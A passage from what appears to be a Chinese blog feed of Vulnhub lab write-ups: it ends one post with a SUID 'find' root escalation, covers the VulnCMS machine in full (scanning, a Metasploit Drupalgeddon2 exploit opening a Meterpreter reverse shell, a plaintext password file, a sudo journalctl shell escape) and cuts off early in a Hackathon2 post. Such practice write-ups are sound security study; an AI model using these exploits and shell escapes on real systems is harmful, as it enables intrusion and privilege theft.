Jan 19  2021 /snap/core18/2066/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/2066/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1885/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1885/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 23  2019 /snap/core18/1885/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1885/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 23  2019 /snap/core18/1885/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 23  2019 /snap/core18/1885/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 23  2019 /snap/core18/1885/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 23  2019 /snap/core18/1885/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 23  2019 /snap/core18/1885/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 110792 Jul 11  2020 /snap/snapd/8542/usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 111080 Apr 24 17:35 /snap/snapd/11841/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure><p>这里参考网上思路，使用<code>find</code>进行提权并读取第二个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/nathan</span><br><span class="line">$ /usr/bin/find . -<span class="built_in">exec</span> /bin/sh -p \; -quit         </span><br><span class="line">/usr/bin/find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(nathan) gid=1000(nathan) euid=0(root) <span class="built_in">groups</span>=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"><span class="comment"># cd /root/</span></span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line"><span class="comment">#root_flag</span></span><br><span class="line">H@v3_a_n1c3_l1fe.</span><br></pre></td></tr></table></figure><p><strong>done</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>不够细心</li><li>没有清晰的渗透步骤，脑子太乱</li><li>坚持</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-VulnCMS</title>
      <link href="/10746.html"/>
      <url>/10746.html</url>
      
        <content type="html"><![CDATA[<h2 id="记录打靶机（VulnCMS）过程"><a href="#记录打靶机（VulnCMS）过程" class="headerlink" title="记录打靶机（VulnCMS）过程"></a>记录打靶机（VulnCMS）过程</h2><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><strong>主机发现</strong><br>使用<code>arp-scan</code>进行主机IP发现，探测网段中目标主机IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 192.168.109.0/24</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.109.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.109.2   00:50:56:f0:a1:15       VMware, Inc.</span><br><span class="line">192.168.109.145 00:0c:29:da:98:92       VMware, Inc.</span><br><span class="line">192.168.109.254 00:50:56:f8:89:68       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 1.938 seconds (132.09 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>经探测发现目标IP地址为<code>192.168.109.145</code>，接着使用<code>nmap</code>对该IP地址进行端口扫描</p><p><strong>端口扫描</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sC -sV -p- 192.168.109.145</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 12:43 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.109.145</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)</span><br><span class="line">|   256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)</span><br><span class="line">|_  256 fa:c9:eb:58:e3:d2:b7:4a:74:77:<span class="built_in">fc</span>:69:0e:b6:68:08 (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: W3.CSS Template</span><br><span class="line">5000/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.7.2</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: fsociety &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">8081/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">| http-robots.txt: 15 disallowed entries </span><br><span class="line">| /joomla/administrator/ /administrator/ /bin/ /cache/ </span><br><span class="line">| /cli/ /components/ /includes/ /installation/ /language/ </span><br><span class="line">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">9001/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: fsociety.web</span><br><span class="line">MAC Address: 00:0C:29:DA:98:92 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 18.84 seconds</span><br></pre></td></tr></table></figure><p>经<code>nmap</code>扫描后发现存在22（ssh）、80（http）、5000（http）、8081（http）、9001（http）<br>因为此靶机除了22（ssh）端口以外其他都是<code>http</code>服务相关的，在漏洞数据库搜索了<code>openssh 7.6</code>后显示存在一个用户名爆破漏洞，但是用处应该不大，因为还需要密码；翻找了其他<code>http</code>服务相关的页面无可用信息（这里主要使用的是目录扫描）。</p><p>但是可以从<code>nmap</code>扫描信息中看到在9001端口运行了<code>Drupal 7</code>服务，之前做相关靶机学习时得知此服务存在exp，这里可以使用<code>msfconsole</code>框架进行搜索加载相关exp。这里有点问题，在做的时候因为用错了exp始终无法返回shell，后面参考了网络上相关文章，此处应该使用<code>exploit/unix/webapp/drupal_drupalgeddon2</code>。</p><p><strong>漏洞利用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">                                                  </span><br><span class="line">                                              `:oDFo:`                            </span><br><span class="line">                                           ./ymM0dayMmy/.                          </span><br><span class="line">                                        -+dHJ5aGFyZGVyIQ==+-                    </span><br><span class="line">                                    `:sm⏣~~Destroy.No.Data~~s:`                </span><br><span class="line">                                 -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          </span><br><span class="line">                          ./etc/shadow.0days-Data<span class="string">&#x27;%20OR%201=1--.No.0MN8&#x27;</span>/.      </span><br><span class="line">                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    </span><br><span class="line">                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  </span><br><span class="line">                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">                      :we<span class="string">&#x27;re.all.alike&#x27;</span>`                     The.PFYroy.No.D7:  </span><br><span class="line">                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">                      :msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">                      :---srwxrwx:-.`                        `MS146.52.No.Per:    </span><br><span class="line">                      :&lt;script&gt;.Ac816/                        sENbove3101.404:    </span><br><span class="line">                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    </span><br><span class="line">                      :09.14.2011.raid                       /STFU|wall.No.Pr:    </span><br><span class="line">                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">                      :<span class="comment">#OUTHOUSE-  -s:                       /corykennedyData:    </span></span><br><span class="line">                      :<span class="variable">$nmap</span> -oS                              SSo.6178306Ence:    </span><br><span class="line">                      :Awsm.da:                            /shMTl<span class="comment">#beats3o.No.:    </span></span><br><span class="line">                      :Ring0:                             `dDestRoyREXKC3ta/M:    </span><br><span class="line">                      :23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line">                       /-                        /yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                                                 `:Shall.We.Play.A.Game?tron/    </span><br><span class="line">                                                 ```-ooy.if1ghtf0r+ehUser5`    </span><br><span class="line">                                               ..th3.H1V3.U2VjRFNN.jMh+.`          </span><br><span class="line">                                              `MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                                               +~KANSAS.CITY<span class="string">&#x27;s~-`                  </span></span><br><span class="line"><span class="string">                                                J~HAKCERS~./.`                    </span></span><br><span class="line"><span class="string">                                                .esc:wq!:`                        </span></span><br><span class="line"><span class="string">                                                 +++ATH`                            </span></span><br><span class="line"><span class="string">                                                  `</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v6.0.30-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit tip: When in a module, use back to go </span></span><br><span class="line"><span class="string">back to the top level prompt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 &gt; search Drupal</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Matching Modules</span></span><br><span class="line"><span class="string">================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   #  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line"><span class="string">   -  ----                                           ---------------  ----       -----  -----------</span></span><br><span class="line"><span class="string">   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span></span><br><span class="line"><span class="string">   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span></span><br><span class="line"><span class="string">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span></span><br><span class="line"><span class="string">   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span></span><br><span class="line"><span class="string">   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span></span><br><span class="line"><span class="string">   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span></span><br><span class="line"><span class="string">   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE</span></span><br><span class="line"><span class="string">   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span></span><br><span class="line"><span class="string">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.109.145</span></span><br><span class="line"><span class="string">rhosts =&gt; 192.168.109.145</span></span><br><span class="line"><span class="string">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 9001</span></span><br><span class="line"><span class="string">rport =&gt; 9001</span></span><br><span class="line"><span class="string">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.109.140:4444 </span></span><br><span class="line"><span class="string">[*] Executing automatic check (disable AutoCheck to override)</span></span><br><span class="line"><span class="string">[+] The target is vulnerable.</span></span><br><span class="line"><span class="string">[*] Sending stage (39282 bytes) to 192.168.109.145</span></span><br><span class="line"><span class="string">[*] Meterpreter session 1 opened (192.168.109.140:4444 -&gt; 192.168.109.145:45078) at 2021-07-27 13:18:40 -0400</span></span><br></pre></td></tr></table></figure><p>利用成功，这里可在<code>misc</code>目录下找到应该存放用户名密码的文件（tyrell.pass），此处也参考了网络上的文章，应该在翻文件时不仔细。。。</p><p><strong>读取密码文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> tyrell.pass</span><br><span class="line">Username: tyrell</span><br><span class="line">Password: mR_R0bo7_i5_R3@!_</span><br></pre></td></tr></table></figure><p>得到用户名密码后可使用<code>ssh</code>进行连接<br>连接成功后需要提权，此处提权依然使用<code>sudo</code>进行提权</p><p><strong>提权</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> tyrell on vuln_cms:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User tyrell may run the following commands on vuln_cms:</span><br><span class="line">    (root) NOPASSWD: /bin/journalctl</span><br></pre></td></tr></table></figure><p>可以看到<code>journalctl</code>运行时不需要验证密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl </span><br><span class="line">-- Logs begin at Fri 2021-05-28 12:16:41 UTC, end at Tue 2021-07-27 17:31:18 UTC. --</span><br><span class="line">May 28 12:16:41 vuln_cms kernel: Linux version 4.15.0-143-generic (buildd@lcy01-amd64-001) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) <span class="comment">#147-Ubuntu SMP Wed Apr 14 16:10:11 UT</span></span><br><span class="line">May 28 12:16:41 vuln_cms kernel: Command line: BOOT_IMAGE=/vmlinuz-4.15.0-143-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro maybe-ubiquity</span><br><span class="line">May 28 12:16:41 vuln_cms kernel: KERNEL supported cpus:</span><br><span class="line">May 28 12:16:41 vuln_cms kernel:   Intel GenuineIntel</span><br><span class="line">May 28 12:16:41 vuln_cms kernel:   AMD AuthenticAMD</span><br><span class="line">May 28 12:16:41 vuln_cms kernel:   Centaur CentaurHauls</span><br><span class="line">May 28 12:16:41 vuln_cms kernel: [Firmware Bug]: TSC doesn<span class="string">&#x27;t count with P0 frequency!</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x001: &#x27;</span>x87 floating point registers<span class="string">&#x27;</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x002: &#x27;</span>SSE registers<span class="string">&#x27;</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x004: &#x27;</span>AVX registers<span class="string">&#x27;</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using &#x27;</span>standard<span class="string">&#x27; format.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: BIOS-provided physical RAM map:</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000100000-0x000000007ffeffff] usable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000007fff0000-0x000000007fffffff] ACPI data</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: NX (Execute Disable) protection: active</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: SMBIOS 2.5 present.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: Hypervisor detected: KVM</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&gt; reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: remove [mem 0x000a0000-0x000fffff] usable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: last_pfn = 0x7fff0 max_arch_pfn = 0x400000000</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: MTRR default type: uncachable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: MTRR variable ranges disabled:</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: MTRR: Disabled</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/PAT: MTRRs disabled, skipping PAT initialization too.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: CPU MTRRs all blank - virtualized system.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/PAT: Configuration [0-7]: WB  WT  UC- UC  WB  WT  UC- UC  </span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff]</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: Scanning 1 areas for low memory corruption</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: RAMDISK: [mem 0x30ec5000-0x34759fff]</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: Early table checksum verification disabled</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX  )</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: XSDT 0x000000007FFF0030 00003C (v01 VBOX   VBOXXSDT 00000001 ASL  00000061)</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: FACP 0x000000007FFF00F0 0000F4 (v04 VBOX   VBOXFACP 00000001 ASL  00000061)</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: DSDT 0x000000007FFF0470 002325 (v02 VBOX   VBOXBIOS 00000002 INTL 20100528)</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040</span></span><br><span class="line"><span class="string">!/bin/sh</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br></pre></td></tr></table></figure><p>程序运行后，输入<code>!/bin/sh</code>可提升至<code>root</code>权限<br>读取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /home/     </span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">elliot  ghost  tyrell</span><br><span class="line"><span class="comment"># cd elliot</span></span><br><span class="line"><span class="comment"># cat user.txt</span></span><br><span class="line">9046628504775551</span><br><span class="line"><span class="comment"># cd /root/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">4359537020406305</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><strong>done</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Hackathon2</title>
      <link href="/16564.html"/>
      <url>/16564.html</url>
      
        <content type="html"><![CDATA[<h2 id="记录打靶机（Hackathon2）的过程"><a href="#记录打靶机（Hackathon2）的过程" class="headerlink" title="记录打靶机（Hackathon2）的过程"></a>记录打靶机（Hackathon2）的过程</h2><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>这里使用的是<code>arp-scan</code>进行扫描，因为在使用<code>netdiscover</code>无法成功探测到网段下存活主机，不知道是不是命令使用不正确，后续研究一下。。。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 192.168.109.1/24                                             </span><br><span class="line"></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140</span><br><span class="line">WARNING: host part of 192.168.109.1/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.109.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.109.2   00:50:56:f0:a1:15       VMware, Inc.</span><br><span class="line">192.168.109.144 00:0c:29:28:21:61       VMware, Inc.</span><br><span class="line">192.168.109.254 